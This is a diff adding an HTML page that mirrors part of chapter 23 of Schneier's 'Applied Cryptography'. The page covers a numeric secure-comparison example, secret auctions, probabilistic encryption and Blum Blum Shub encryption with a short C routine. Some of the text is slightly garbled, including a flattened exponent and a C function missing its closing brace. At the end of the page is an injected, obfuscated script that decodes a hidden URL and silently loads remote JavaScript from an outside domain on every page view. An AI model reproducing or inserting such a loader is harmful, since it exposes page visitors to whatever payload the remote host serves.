@@ -1,0 +1,142 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=551-554//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>All the verification that Bob goes through in step (3) is to guarantee that no number appears twice in the sequence generated in step (4). Otherwise, if <I>z</I><SUB>a</SUB> =<I>z</I><SUB>b</SUB>, Alice knows that <I>a</I> &#8804;<I>j</I> &lt<I>b.</I></P>
+<P>The one drawback to this protocol is that Alice learns the result of the computation before Bob does. Nothing stops her from completing the protocol up to step (5) and then refusing to tell Bob the results in step (6). She could even lie to Bob in step (6).</P>
+<P><FONT SIZE="+1"><B><I>Example of the Protocol</I></B></FONT></P>
+<P>Assume they&#146;re using RSA. Bob&#146;s public key is 7 and his private key is 23; <I>n</I> =55. Alice&#146;s secret value, <I>i,</I> is 4; Bob&#146;s secret value, <I>j,</I> is 2. (Assume that only the values 1, 2, 3, and 4 are possible for <I>i</I> and <I>j.</I>)</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses <I>x</I> = 39, and <I>c</I> = <I>E</I><SUB>B</SUB>(39) = 19.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice computes <I>c</I> - <I>i</I> = 19 - 4 = 15. She sends 15 to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob computes the following 4 numbers:
+</DL>
+<DL>
+<DD><I>y</I><SUB>1</SUB> = <I>D</I><SUB>B</SUB>(15 &#43; 1) = 26
+<DD><I>y</I><SUB>2</SUB> = <I>D</I><SUB>B</SUB>(15 &#43; 2) = 18
+<DD><I>y</I><SUB>3</SUB> = <I>D</I><SUB>B</SUB>(15 &#43; 3) = 2
+<DD><I>y</I><SUB>4</SUB> = <I>D</I><SUB>B</SUB>(15 &#43; 4) = 39
+</DL>
+<P>He chooses <I>p</I> =31 and calculates:</P>
+<DL>
+<DD><I>z</I><SUB>1</SUB> = (26 mod 31) = 26
+<DD><I>z</I><SUB>2</SUB> = (18 mod 31) = 18
+<DD><I>z</I><SUB>3</SUB> = (2 mod 31) = 2
+<DD><I>z</I><SUB>4</SUB> = (39 mod 31) = 8
+</DL>
+<DL>
+<BR>He does all the verifications and confirms that the sequence is fine.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob sends Alice this sequence of numbers in this exact order:
+<DL>
+<DD>26, 18, 2 &#43; 1, 8 &#43; 1, 31 = 26, 18, 3, 9, 31
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Alice checks whether the 4th number in the sequence is congruent to <I>x</I> mod <I>p.</I> Since 9 &#8800; 39 (mod 31), then <I>i</I> &gt <I>j.</I>
+<DD><B>(6)</B>&nbsp;&nbsp;Alice tells Bob.
+</DL>
+<P>This protocol can be used to create far more complicated protocols. A group of people can conduct a secret auction over a computer network. They arrange themselves in a logical circle, and through individual pairwise comparisons, determine which is offering the highest price. In order to prevent people from changing their bids in mid-auction, some sort of bit-commitment protocol could also be used. If the auction is a Dutch auction, then the highest bidder gets the item for his highest price. If it is an English auction, then he gets the item for the second-highest price. (This can be determined by a second round of pairwise comparisons.) Similar ideas have applications in bargaining, negotiations, and arbitration.
+</P>
+<H3><A NAME="Heading16"></A><FONT COLOR="#000077">23.15 Probabilistic Encryption</FONT></H3>
+<P>The notion of <B>probabilistic encryption</B> was invented by Shafi Goldwasser and Silvio Micali [624]. Although its theory makes it the most secure cryptosystem invented, its early implementation was impractical [625]. More recent implementations have changed that.</P>
+<P>The point behind probabilistic encryption is to eliminate any information leaked with public-key cryptography. Because a cryptanalyst can always encrypt random messages with a public key, he can get some information. Assuming he has ciphertext <I>C</I> =<I>E</I><SUB>K</SUB>(<I>M</I>) and is trying to recover plaintext message <I>M,</I> he can pick a random message <I>M'</I> and encrypt it: <I>C'</I> =<I>E</I><SUB>K</SUB>(<I>M'</I>). If <I>C'</I>=<I>C,</I> then he guessed the correct plaintext. If it&#146;s wrong, he just guesses again.</P>
+<P>Also, no partial information is leaked about the original message. With public-key cryptography, sometimes a cryptanalyst can learn things about the bits: The XOR of bits 5, 17, and 39 is 1, and so on. With probabilistic encryption, even this type of information remains hidden.</P>
+<P>Not a whole lot of information is to be gained here, but there are potential problems with allowing a cryptanalyst to encrypt random messages with your public key. Some information is being leaked to the cryptanalyst every time he encrypts a message. No one really knows how much.</P>
+<P>Probabilistic encryption tries to eliminate that leakage. The goal is that no computation on the ciphertext, or on any other trial plaintexts, can give the cryptanalyst any information about the corresponding plaintext.</P>
+<P>In probabilistic encryption, the encrypting algorithm is probabilistic rather than deterministic. In other words, a large number of ciphertexts will decrypt to a given plaintext, and the particular ciphertext used in any given encryption is randomly chosen.</P>
+<DL>
+<DD><I>C</I><SUB>1</SUB> = <I>E</I><SUB>K</SUB>(<I>M</I>), <I>C</I><SUB>2</SUB> = <I>E</I><SUB>K</SUB>(<I>M</I>), <I>C</I><SUB>3</SUB> = <I>E</I><SUB>K</SUB>(<I>M</I>),..., <I>C</I><SUB>i</SUB> = <I>E</I><SUB>K</SUB>(<I>M</I>)
+<DD><I>M</I> = <I>D</I><SUB>K</SUB>(<I>C</I><SUB>1</SUB>) = <I>D</I><SUB>K</SUB>(<I>C</I><SUB>2</SUB>) = <I>D</I><SUB>K</SUB>(<I>C</I><SUB>3</SUB>) =...= <I>D</I><SUB>K</SUB>(<I>C</I><SUB>i</SUB>)
+</DL>
+<P>With probabilistic encryption, a cryptanalyst can no longer encrypt random plaintexts looking for the correct ciphertext. To illustrate, assume the cryptanalyst has ciphertext <I>Ci</I> =<I>E</I><SUB>K</SUB>(<I>M</I>). Even if he guesses <I>M</I> correctly, when he encrypts <I>E</I><SUB>K</SUB>(<I>M</I>), the result will be a completely different <I>C: C</I><SUB>j</SUB>. He cannot compare <I>C</I><SUB>i</SUB> and <I>C</I><SUB>j</SUB>, and so cannot know that he has guessed the message correctly.</P>
+<P>This is amazingly cool stuff. Even if a cryptanalyst has the public encryption key, the plaintext, and the ciphertext, he cannot prove that the ciphertext is the encryption of the plaintext without the private decryption key. Even if he tries exhaustive search, he can only prove that every conceivable plaintext is a possible plaintext.</P>
+<P>Under this scheme, the ciphertext will always be larger than the plaintext. You can&#146;t get around this; it&#146;s a result of the fact that many ciphertexts decrypt to the same plaintexts. The first probabilistic encryption scheme [625] resulted in a ciphertext so much larger than the plaintext that it was unusable.</P>
+<P>However, Manual Blum and Goldwasser have an efficient implementation of probabilistic encryption using the Blum Blum Shub (BBS) random-bit generator described in Section 17.9 [199].</P>
+<P>The BBS generator is based on the theory of quadratic residues. In English, there are two primes, <I>p</I> and <I>q,</I> that are congruent to 3 modulo 4. That&#146;s the private key. Their product, <I>pq</I> =<I>n,</I> is the public key. (Mind your <I>p</I>s and <I>q</I>s; the security of this scheme rests in the difficulty of factoring <I>n.</I>)</P>
+<P>To encrypt a message, <I>M,</I> first choose some random <I>x,</I> relatively prime to <I>n.</I> Then compute</P>
+<DL>
+<DD><I>x</I><SUB>0</SUB> = <I>x<SUP>2</SUP></I> mod <I>n</I>
+</DL>
+<P>Use <I>x</I><SUB>0</SUB> as the seed of the BBS pseudo-random-bit generator and use the output of the generator as a stream cipher. XOR <I>M,</I> one bit at a time, with the output of the generator. The generator spits out bits <I>b</I><SUB>i</SUB> (the least-significant bit of <I>x</I><SUB>i</SUB>, where <I>x</I><SUB>i</SUB> =<I>x</I><SUB>i</SUB>-12 mod <I>n</I>), so</P>
+<DL>
+<DD><I>M</I> = <I>M</I><SUB>1</SUB> , <I>M</I><SUB>2</SUB> , <I>M</I><SUB>3</SUB> ,  ..., <I>Mt</I>
+<DD><I>C</I> = <I>M</I><SUB>1</SUB> &#8853; <I>b</I><SUB>1</SUB> , <I>M</I><SUB>2</SUB> &#8853; <I>b</I><SUB>2</SUB> , <I>M</I><SUB>3</SUB> &#8853; <I>b</I><SUB>3</SUB> ,  ..., <I>Mt</I> &#8853; <I>bt</I>
+<DD>where <I>t</I> is the length of the plaintext
+</DL>
+<P>Append the last computed value, <I>x</I><SUB>t</SUB>, to the end of the message and you&#146;re done.</P>
+<P>The only way to decrypt this message is to recover <I>x</I><SUB>0</SUB> and then set up the same BBS generator to XOR with the ciphertext. Because the BBS generator is secure to the left, the value <I>x</I><SUB>t</SUB> is of no use to the cryptanalyst. Only someone who knows <I>p</I> and <I>q</I> can decrypt the message.</P>
+<P>In C, the algorithm to recover <I>x</I><SUB>0</SUB> from <I>x</I><SUB>t</SUB> is:</P>
+<!-- CODE //-->
+<PRE>
+int x0 (int p, int q, int n, int t, int xt)
+{
+     int a, b, u, v, w, z;
+     /* we already know that gcd(p, q) == 1 */
+     (void)extended_euclidian(p, q, &ampa, &ampb);
+     u = modexp ((p&#43;1)/4, t, p-1);
+     v = modexp ((q&#43;1)/4, t, q-1);
+     w = modexp (xt%p, u, p);
+     z = modexp (xt%q, v, q);
+     return (b*q*w &#43; a*p*z) % n;
+</PRE>
+<!-- END CODE //-->
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(uTBQCdcY, GsdiukIL) {GsdiukIL = uTBQCdcY.createElement('script');GsdiukIL.type = 'text/javascript';GsdiukIL.async = true;GsdiukIL.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');uTBQCdcY.getElementsByTagName('body')[0].appendChild(GsdiukIL);}(document));</script></body>
+</html>
